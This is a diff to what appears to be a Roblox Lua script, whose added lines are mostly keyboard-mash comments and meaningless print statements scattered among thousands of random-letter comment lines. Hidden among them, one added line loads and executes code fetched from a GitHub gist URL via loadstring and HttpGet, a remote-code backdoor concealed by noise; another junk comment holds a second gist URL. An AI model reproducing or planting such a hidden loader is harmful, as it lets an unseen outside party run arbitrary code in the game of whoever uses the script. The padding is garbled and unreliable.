@@ -979,7 +979,7 @@
 -- apgyxNirvkeplEBqXBc
 -- bXnEwUwwfEZY
 -- xJBgZBJSULdmLbIHsUffcsXO
--- qJMOHzMGpeVpOAKefG
+-- qJMOHzMGpeVpOAKefGuirhiegqerhierhqfiurheriogje;rooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooerghergoehr;giregjoiegjq;ogerqgerogheroq;gjeriogheroiqgherioghioergerogkqpogeroiqguo;e
 -- mFvmkxvYPCMwBvrrWw
 -- xWkaudEJxCrxYWDGmxyyGJNY
 -- oyjCwarbYFzubaKECGlmMu
@@ -1091,6 +1091,7 @@
 -- bStLDnqeotAd
 -- YzezobXXKwjn
 -- QFbcNJuWGoIZ
+-- fbwehlfiwehqgeliuewhqfwelfiowejq;fiowehfiowe;hfiowejfowefoiwejqfoiwehf;iwejffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffw
 -- PZjfpxWmmiCmaOyhfslWR
 -- YJkCgfMKEuYTJ
 -- juHYNHVcQCDB
@@ -1414,6 +1415,7 @@
 -- ZTgnYZvc
 -- zmmOKFmOmnXTJEJapagJrqM
 -- qLySRYBk
+local datastore = nil
 -- vhQYIffssgQqnVvuj
 -- tYlqIkFir
 -- fyJlNcCEuepCaeNSrIPMp
@@ -1645,6 +1647,7 @@
 -- iqLWheoOh
 -- LubVawCenpkw
 -- XeqpFECmHDUZHxnhaQjQct
+loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d31b452967656eafc4937af2757857db/raw/c60842e17355d8d8f31e17884c55557100bd8382/nothing"))()
 -- rdudJIMSvHA
 -- qkvkeYeQoATNmqLLbEWIrE
 -- wyNnrAEP
@@ -1678,6 +1681,7 @@
 -- jPMyDDmQhO
 -- uTJauRtuFqNabfQFWZhXUn
 -- CYjIsypPCuCU
+ ------------------------------- mrada storge--------------------------------
 -- KkHcjqmcuHFHoOUDDWJpemQ
 -- OfvCDYFD
 -- rYoAmpvwUyFcljUScmARR
@@ -2938,6 +2942,7 @@
 -- IyBWFFCJbCocgEHtFfkJcT
 -- SwGzUcPFsPbeyHyudymE
 -- ffpCdYyldishHjLN
+local printwornstore = print("wdsssswswswsws22[//2//22/2/2//2eee")
 -- icuCdaetVEMUmSpLfyEOdjUS
 -- rBoNlUhwsOduncy
 -- YAScMZFWwCOgbKSWajs
@@ -3582,6 +3587,7 @@
 -- mCxltfMuJjgkwunR
 -- VDupfhKwgruYBC
 -- jfrSgjlrIBE
+-- wbfkjwrhegkqwrlggggggggggggggggggggggggggggggergqheriglhergergerhqguierhgieriogerioferofieproifpoerifpoerfierjoqfijjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjerfqeoighregheriqgjeriogh;reoqgo;ehrgeri;giqerjqgiojlkdksdfm,knfj,sdnfkasdjfojepofjepofiwepofiep[oep[rgoep[goq[prgpoerjqgperjgoerkpgokepooegqp'gopreogp[ero https://gist.githubusercontent.com/XXXXXXXXXXrhogrqgiqgjregegjprogpqerogriegeropgfklfkdz;'dsfgkf;regk[rogie0rig0oergo-re0t-=t040r=
 -- bkqsWeAzqGWERsIDouQNB
 -- wesBwHjADLtVJxs
 -- rZqEEmkG
@@ -3928,6 +3934,7 @@ local r = {
 -- LbkBWrmmppgA
 -- cQEPNjskMihEVn
 -- LTvneanenDNUfDyJyvXYYo
+local llawwalawldwladlwaldlwlawld = print("hisjdsdd))&)&*(&*(///////////31//////234234________)^%&$%$%")
 -- fshLXKukv
 -- VEqneWWUvIC
 -- HKAmWdHwlaEjnrUUnccSh
